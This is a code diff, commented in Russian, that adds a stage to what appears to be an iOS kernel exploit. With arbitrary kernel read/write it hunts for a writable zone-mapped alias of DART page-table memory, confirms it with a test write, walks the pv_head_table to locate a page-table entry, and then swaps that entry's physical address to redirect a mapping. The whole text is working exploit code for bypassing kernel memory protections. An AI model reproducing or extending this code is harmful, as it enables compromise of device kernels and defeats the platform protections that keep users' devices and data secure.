@@ -7615,6 +7615,64 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 pteVA = aliasVA;   // дальше патч/чек идут через алиас
             }
         }
+        // 1.9.210: P5 — ZONE-АЛИАС таблиц. Physmap RO (паника 01:51), но драйвер
+        // пишет PTE из EL1 — через другой VA. Сегментные структуры [dartObj+0xcd0]
+        // в zone-полосе: если kvtophys(struct) в табличном регионе — это страницы
+        // таблиц, и zone-VA = алиас записи. Proof: scratch в пустой слот через
+        // zone-VA, сверка через physmap. Потом pv reverse-lookup листа → PTE patch.
+        if (!pteVA && ptePAFound) {
+            BOOL zoneOK = NO;
+            for (uint32_t i = 0; i < 8 && !zoneOK; i++) {
+                uint64_t s = kpLooksLikeKernelPointer(dartVA) ? kp_untag_ptr(early_kread64(dartVA + 0xcd0 + (uint64_t)i * 8)) : 0;
+                if (!kpLooksLikeKernelPointer(s) || !kpSafeToRead(s)) continue;
+                uint64_t spa = kvtophys(s);
+                int st = spa ? kpFrameTypeOf(spa) : -1;
+                kpNote(r, [NSString stringWithFormat:@"  [P5] seg[%u]=%#llx → PA %#llx тип %#x", i, (unsigned long long)s, (unsigned long long)spa, st]);
+                if (spa >= 0x10008000000ULL && spa < 0x10010000000ULL) {
+                    for (uint32_t o = 0x40; o + 8 <= 0x400; o += 8) {
+                        if (early_kread64(s + o) != 0) continue;
+                        usleep(2000);   // os_log впереди возможной паники
+                        early_kwrite64(s + o, 0x5AFEC0FFEE112233ULL);
+                        uint64_t rbA = early_kread64(s + o);
+                        uint64_t phk = phystokv(spa);
+                        uint64_t rbB = phk ? early_kread64(phk + o) : 0;
+                        kpNote(r, [NSString stringWithFormat:@"  [P5] ★ PROOF zone-запись в таблицу seg[%u]+%#x: zone=%#018llx physmap=%#018llx — %@",
+                                  i, o, (unsigned long long)rbA, (unsigned long long)rbB,
+                                  (rbA == 0x5AFEC0FFEE112233ULL) ? @"ZONE-АЛИАС ПИШЕТ!" : @"мимо"]);
+                        early_kwrite64(s + o, 0);
+                        zoneOK = (rbA == 0x5AFEC0FFEE112233ULL);
+                        break;
+                    }
+                }
+            }
+            if (zoneOK) {
+                uint64_t ppnum = (ptePAFound & ~0x3fffULL) >> 14;
+                uint64_t pvTab = ksymbol(pv_head_table);
+                uint64_t pvh = pvTab ? early_kread64(pvTab + ppnum * 8) : 0;
+                kpNote(r, [NSString stringWithFormat:@"  [P5] pv: ppnum=%#llx head=%#llx", (unsigned long long)ppnum, (unsigned long long)pvh]);
+                uint64_t node = pvh;
+                for (int depth = 0; depth < 8 && kpLooksLikeKernelPointer(node) && !pteVA; depth++) {
+                    uint64_t cands[3] = { early_kread64(node + 0), early_kread64(node + 8), early_kread64(node + 0x10) };
+                    kpNote(r, [NSString stringWithFormat:@"    pv[%d] %#llx: {%#018llx, %#018llx, %#018llx}", depth, (unsigned long long)node,
+                              (unsigned long long)cands[0], (unsigned long long)cands[1], (unsigned long long)cands[2]]);
+                    for (int c = 0; c < 3 && !pteVA; c++) {
+                        uint64_t cv = kp_untag_ptr(cands[c]);
+                        if (cv >= 0xffffffd000000000ULL && cv < 0xfffffff000000000ULL && (cv & 0x3fffULL) == (ptePAFound & 0x3fffULL)) {
+                            pteVA = cv;
+                            kpNote(r, [NSString stringWithFormat:@"  [P5] ★ ZONE-АЛИАС листа: pv[%d] поле%d = %#llx — запись PTE через неё", depth, c, (unsigned long long)cv]);
+                        }
+                    }
+                    node = 0;
+                    for (int c = 0; c < 3 && !node; c++) {
+                        uint64_t nx = kp_untag_ptr(cands[c]);
+                        if (kpLooksLikeKernelPointer(nx) && nx != pteVA) node = nx;
+                    }
+                }
+                if (!pteVA) kpNote(r, @"  [P5] pv-цепочка не дала zone-VA листа — layout в логе для разбора");
+            } else {
+                kpNote(r, @"  [P5] seg-структуры вне табличного региона — proof не состоялся");
+            }
+        }
         if (pteVA) {
             uint64_t newPTE = (origPTE & ~ptePAMask) | (ctlPA & ptePAMask);
             kpNote(r, [NSString stringWithFormat:@"  [P2] ПОДМЕНА PTE %#018llx → %#018llx", (unsigned long long)origPTE, (unsigned long long)newPTE]);
